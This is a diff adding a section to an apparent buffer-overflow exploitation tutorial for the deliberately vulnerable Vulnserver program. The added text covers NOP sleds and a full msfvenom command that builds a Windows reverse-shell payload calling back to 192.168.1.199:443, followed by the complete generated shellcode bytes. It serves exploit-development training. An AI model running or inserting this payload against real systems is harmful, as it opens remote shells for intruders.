@@ -403,7 +403,6 @@ We are now presented with the following pane:
 As you can see, our entire sequence is presented unbroken. We have determined that `\x00` is our only bad character. This will likely not be the case very often and you must rigorously check for bad characters by iterating through this process until all bad characters are eliminated. 
 
 ### Finding a `JMP ESP` Call Within Vulnserver
-
 Our last use of Mona will be asking her to find a location within the vulnserver application where there is a memory address which holds the instruction `JMP ESP`. If we are able to place this memory location address into `EIP`, then the process will see that the address of the next instruction to execute is saying that the instruction is `JMP ESP` and our process will go to `ESP` and execute whatever instructions are located there, in this case our payload!
 
 But not only do we have to find a `JMP ESP` call, we have to find one that is within a module that does not have ASLR enabled. ASLR will randomize the instruction location each time the computer reboots so that these types of exploits are unfeasible. However, programs are not beholden to strictly use ASLR-enabled, Microsoft-approved modules and often include non-ASLR modules. 
@@ -444,6 +443,58 @@ s.send("TRUN /.:/ " + buffer)
 print s.recv(1024)
 s.close()
 ```
+
+### Code Execution!
+All that's left for us to do at this point is to replace the value of the stack, currently a bunch of `C` values or bad chars depending on your workflow, with our shellcode. We will also want to prepend some `NOPs` to our payload so that we increase the surface area so to speak of our exploitable code and increase the chance of the program flowing to the location of our shellcode. 
+
+We can do this simply by adding a variable to our script called `nop` and use the line `nop = '\x90' * 15`.
+
+15 is largely an arbitrary number that I often use for this purpose. The amount of `NOPs` you use is up to you, but don't use so many that it affects your buffer space drastically and reduces the amount of space you can fit your shellcode. 
+
+To generate our payload with `msfvenom` we use the following command: `msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.199 lport=443 EXITFUNC=thread -b "\x00" -f c` which can be broken down as follows:
++ `-p windows/shell_reverse_tcp` is setting the payload to a stageless windows (x86 by default) reverse shell payload
++ `EXITFUNC=thread` tells `msfvenom` to create the payload in such a way that it is run in a sub-thread of the process helping us to avoid crashing the program and achieving a smooth exit
++ `-b "\x00"` specifies what characters to not use in the payload 
++ `-f c` specifies that we want the output in C format. 
+
+```terminal_session
+astrid:~/ # msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.199 lport=443 EXITFUNC=thread -b "\x00" -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai chosen with final size 351
+Payload size: 351 bytes
+Final size of c file: 1500 bytes
+unsigned char buf[] = 
+"\xdb\xcc\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbf\x36\x08\x50"
+"\xc1\x31\x7a\x17\x83\xc2\x04\x03\x4c\x1b\xb2\x34\x4c\xf3\xb0"
+"\xb7\xac\x04\xd5\x3e\x49\x35\xd5\x25\x1a\x66\xe5\x2e\x4e\x8b"
+"\x8e\x63\x7a\x18\xe2\xab\x8d\xa9\x49\x8a\xa0\x2a\xe1\xee\xa3"
+"\xa8\xf8\x22\x03\x90\x32\x37\x42\xd5\x2f\xba\x16\x8e\x24\x69"
+"\x86\xbb\x71\xb2\x2d\xf7\x94\xb2\xd2\x40\x96\x93\x45\xda\xc1"
+"\x33\x64\x0f\x7a\x7a\x7e\x4c\x47\x34\xf5\xa6\x33\xc7\xdf\xf6"
+"\xbc\x64\x1e\x37\x4f\x74\x67\xf0\xb0\x03\x91\x02\x4c\x14\x66"
+"\x78\x8a\x91\x7c\xda\x59\x01\x58\xda\x8e\xd4\x2b\xd0\x7b\x92"
+"\x73\xf5\x7a\x77\x08\x01\xf6\x76\xde\x83\x4c\x5d\xfa\xc8\x17"
+"\xfc\x5b\xb5\xf6\x01\xbb\x16\xa6\xa7\xb0\xbb\xb3\xd5\x9b\xd3"
+"\x70\xd4\x23\x24\x1f\x6f\x50\x16\x80\xdb\xfe\x1a\x49\xc2\xf9"
+"\x5d\x60\xb2\x95\xa3\x8b\xc3\xbc\x67\xdf\x93\xd6\x4e\x60\x78"
+"\x26\x6e\xb5\x2f\x76\xc0\x66\x90\x26\xa0\xd6\x78\x2c\x2f\x08"
+"\x98\x4f\xe5\x21\x33\xaa\x6e\x8e\x6c\xb5\xa9\x66\x6f\xb5\x34"
+"\xcc\xe6\x53\x5c\x22\xaf\xcc\xc9\xdb\xea\x86\x68\x23\x21\xe3"
+"\xab\xaf\xc6\x14\x65\x58\xa2\x06\x12\xa8\xf9\x74\xb5\xb7\xd7"
+"\x10\x59\x25\xbc\xe0\x14\x56\x6b\xb7\x71\xa8\x62\x5d\x6c\x93"
+"\xdc\x43\x6d\x45\x26\xc7\xaa\xb6\xa9\xc6\x3f\x82\x8d\xd8\xf9"
+"\x0b\x8a\x8c\x55\x5a\x44\x7a\x10\x34\x26\xd4\xca\xeb\xe0\xb0"
+"\x8b\xc7\x32\xc6\x93\x0d\xc5\x26\x25\xf8\x90\x59\x8a\x6c\x15"
+"\x22\xf6\x0c\xda\xf9\xb2\x2d\x39\x2b\xcf\xc5\xe4\xbe\x72\x88"
+"\x16\x15\xb0\xb5\x94\x9f\x49\x42\x84\xea\x4c\x0e\x02\x07\x3d"
+"\x1f\xe7\x27\x92\x20\x22";
+```
+
+
 
 
 
